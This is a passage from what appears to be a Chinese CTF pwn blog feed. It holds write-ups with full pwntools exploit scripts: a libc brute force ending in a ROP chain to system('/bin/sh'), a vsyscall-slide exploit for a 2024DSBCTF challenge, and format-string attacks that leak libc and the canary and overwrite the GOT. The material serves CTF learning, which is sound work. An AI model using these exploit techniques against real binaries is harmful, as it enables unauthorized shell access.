class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为 process 或 remote</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;challenge.basectf.fun&quot;, 20961)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):  <span class="comment"># 0x00 到 0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Trying p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 每次循环都需要重新创建进程</span></span><br><span class="line">    payload = cyclic(<span class="number">0x100</span> + <span class="number">8</span>) + p8(i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = p.recvuntil(<span class="string">&quot;you said &quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recv())</span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            libc_start_main = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - i + <span class="number">0xc0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] Correct p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] libc_start_main: <span class="subst">&#123;<span class="built_in">hex</span>(libc_start_main)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="comment"># 后续的攻击逻辑</span></span><br><span class="line">            base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">            system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">            bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">            pop_rdi_ret = base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">            ret = base + <span class="number">0x0000000000029139</span></span><br><span class="line"></span><br><span class="line">            payload = cyclic(<span class="number">0x108</span>) + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 找到正确的值后退出循环</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p8 value <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure></div><ul><li>效果：在出现输出停止的时候就说明那个数字是有效的，因为此时你已经远程控制服务器了，等待着你输出指令。</li><li>0xc0对应的是__libc_start_main的地址。</li><li>题目中没有相应的gadget,但是libc.so文件里面也有gadget，通过libc_base+偏移也可以使用</li></ul><h1 id="vsyscall绕过"><a href="#vsyscall绕过" class="headerlink" title="vsyscall绕过"></a>vsyscall绕过</h1><p>参考文章:<a class="link" href="https://blog.csdn.net/FUCKING12/article/details/127395040">vsyscall滑梯 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>在开启PIE的情况下，如果我们没法<code>泄露pie</code>我们该怎么办呢？这里介绍一下新的东西：<code>vsyscall</code></li><li><del>引自gpt</del></li></ul><blockquote><p><code>vsyscall</code> 是 Linux 内核中用于实现某些系统调用的一种机制。它提供了一种非常高效的方式来执行系统调用，主要用于优化一些常见的系统调用的性能。为了更好地理解 <code>vsyscall</code>，我们需要从 Linux 系统调用的实现和优化角度来探讨。</p><h3 id="系统调用简介"><a href="#系统调用简介" class="headerlink" title="系统调用简介"></a>系统调用简介</h3><p>在 Linux 中，用户程序通过系统调用（system call）来请求内核服务。正常的系统调用过程通常涉及用户空间与内核空间之间的上下文切换。每当用户程序需要进行系统调用时，它会触发一个软件中断（如 <code>int 0x80</code> 或 <code>syscall</code> 指令），从而进入内核态。</p></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../1324469efcd1c57cda1b98b358877131.png" alt="这就是那四个函数"></p><ul><li>这三部分就是vsyscall的函数的调用了，运用syscall进行内核请求，最后ret</li><li>主要分为下面三种操作</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (vsyscall_nr) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="comment">/* this decodes regs-&gt;di and regs-&gt;si on its own */</span></span><br><span class="line">ret = __x64_sys_gettimeofday(regs);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">/* this decodes regs-&gt;di on its own */</span></span><br><span class="line">ret = __x64_sys_time(regs);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">/* while we could clobber regs-&gt;dx, we didn&#x27;t in the past... */</span></span><br><span class="line">orig_dx = regs-&gt;dx;</span><br><span class="line">regs-&gt;dx = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* this decodes regs-&gt;di, regs-&gt;si and regs-&gt;dx on its own */</span></span><br><span class="line">ret = __x64_sys_getcpu(regs);</span><br><span class="line">regs-&gt;dx = orig_dx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>vsyscall的地址是不会变的，通常是<code>0xffffffffff600000</code><mark></mark></mark></li><li>也就是说我们也可以将<code>vsyscall</code>当作<code>ret</code>来运用，即<code>vsyscall滑梯</code></li></ul><h2 id="2024DSBCTF-ctfshow"><a href="#2024DSBCTF-ctfshow" class="headerlink" title="2024DSBCTF(ctfshow)"></a>2024DSBCTF(ctfshow)</h2><p>题目链接：<a class="link" href="https://ctf.show/challenges#CheckIn-4486">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>main函数，很简单，虽然没有溢出，但是有个jmp,直接看汇编</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setinit(a1, a2, a3);</span><br><span class="line">  logo();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hack me!\n&quot;</span>, <span class="number">9uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xFF</span>uLL);</span><br><span class="line">  __asm &#123; jmp     qword ptr [rax] &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>很简单，只要我们修改<code>rbp+buf-0x40</code>的值为后门函数，那么就可以jmp到后门函数getshell了</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000009EB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000000009F2                 add     rax, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00000000000009F6                 jmp     qword ptr [rax]</span><br></pre></td></tr></table></figure></div><ul><li>后门函数：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_A13</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wtf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">7uLL</span>);</span><br><span class="line">  buf[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  system(buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>但是真这么简单吗？checksec 看看</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RUNPATH:  b<span class="string">&#x27;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&#x27;</span></span><br></pre></td></tr></table></figure></div><ul><li>可以发现开启了PIE，我们无法直接jmp到后门函数，同时也无法泄露PIE，但是我们可以用vsyscall滑梯啊，虽然不能直接jmp到后门函数，但是可以ret到后门函数的地方执行</li></ul><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>随便发个东西下断点：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113192703897.bmp"></p><ul><li>可以发现我们一直ret到rbp上方四个机器字长的时候，将该地址末字节改为<code>\x13</code>即可进入到后门函数</li></ul><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;pwn.challenge.ctf.show&quot;,28217)</span></span><br><span class="line">p = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment">#libc = ELF(libc)</span></span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span></span><br><span class="line">ru(<span class="string">&quot;Hack me!\n&quot;</span>)</span><br><span class="line">payload = p64(vsyscall) * <span class="number">30</span></span><br><span class="line">payload += <span class="string">b&#x27;\x13&#x27;</span></span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()  </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="注意🤨🤨"><a href="#注意🤨🤨" class="headerlink" title="注意🤨🤨"></a>注意🤨🤨</h2><p>最开始我payload用了0x40的垃圾数据填充，但是是不行的，思考一下🤯🤯：</p><ul><li>经过jmp rax那部分指令,rsp的地址是不会发生改变的，即使我们使用<code>vsyscall</code>即<code>ret</code>(pop rip),也是从rsp开始将数据给rip继续执行，所以一开始填充垃圾数据那么便会出现下面的情况：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113193430206.bmp"></p><p><mark>下一步<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113193441272.bmp"></p><ul><li>所以要将栈上的数据都填充为<code>vsyscall</code>，然后滑到后门函数</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="栈上格式化字符串"><a href="#栈上格式化字符串" class="headerlink" title="栈上格式化字符串"></a>栈上格式化字符串</h1><h2 id="1-64位泄露libc地址"><a href="#1-64位泄露libc地址" class="headerlink" title="1.64位泄露libc地址"></a>1.64位泄露libc地址</h2><ul><li>开始前可以先参考我的博客：<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/140495295?spm=1001.2014.3001.5502">BUUCTF axb_2019_fmt32 &amp; fmt64_格式化字符串泄露libc-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><p><font size="4" color="red">题目 BaseCTF week3-format_string_level2</font></p><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%88%E4%B8%8A-x64.bmp" alt="栈上-x64"></p><ul><li>很明显的格式化字符串漏洞，没有后门函数，需要泄露libc。</li><li>偏移照惯例找就行了，这里就不展示了，<strong>偏移是6</strong>，需要注意64位和32利用格式化字符串漏洞实现任意地址读的区别：<strong>64位的地址多了许多0，所以导致不可以在payload前面填要读的地址</strong></li></ul><p><font size="4" color="red">举例：</font></p><p>payload &#x3D; p64(printf_got) + b’%6$s’ 这样写在输出的时候，读完printf_got就结束了，got表地址就只有三字节，后面全是<strong>补全的\x00,会导致printf输出截断</strong>，<strong>所以printf_got应该放在后面。</strong></p><p><font size="4" color="red">题解：</font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">49786</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./fmt&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># 偏移6</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(read_got) <span class="comment">#前面补全8字节，防止\x00截断</span></span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span>)</span><br><span class="line">base = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="2-泄露canary"><a href="#2-泄露canary" class="headerlink" title="2.泄露canary"></a>2.泄露canary</h2><p><font size="4" color="red">题目 NSSCTF 3rd ezstack:</font></p><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240826120221017.bmp"></p><ul><li>可以发现很明显的格式化字符串漏洞，但是只可以利用一次，由于<strong>printf遇到\x00才会停止输出</strong>，利用这个特性，加上任意地址可读的漏洞利用，<strong>我们可以泄露出canary</strong>。</li><li>难点其实在于<font size="4" color="red">找偏移</font></li></ul><p><font size="4" color="red">以本题举个例子：</font></p><p>buf距离canary 0x38的位置，在栈上差距0x38&#x2F;8&#x3D;7个位置，再加上64位传入前六个参数位于寄存器中，所以偏移其实是<strong>7+6&#x3D;13</strong>，然后就可以开始得到canary，进行正常的ret2libc：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移6+7</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28183)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401303</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_address &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">LibcSearcher 没搜到，上网站找的</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="string">base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) +p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="3-只有一次格式化字符串漏洞利用机会"><a href="#3-只有一次格式化字符串漏洞利用机会" class="headerlink" title="3.只有一次格式化字符串漏洞利用机会"></a>3.只有一次格式化字符串漏洞利用机会</h2><h3 id="1-修改fini-array"><a 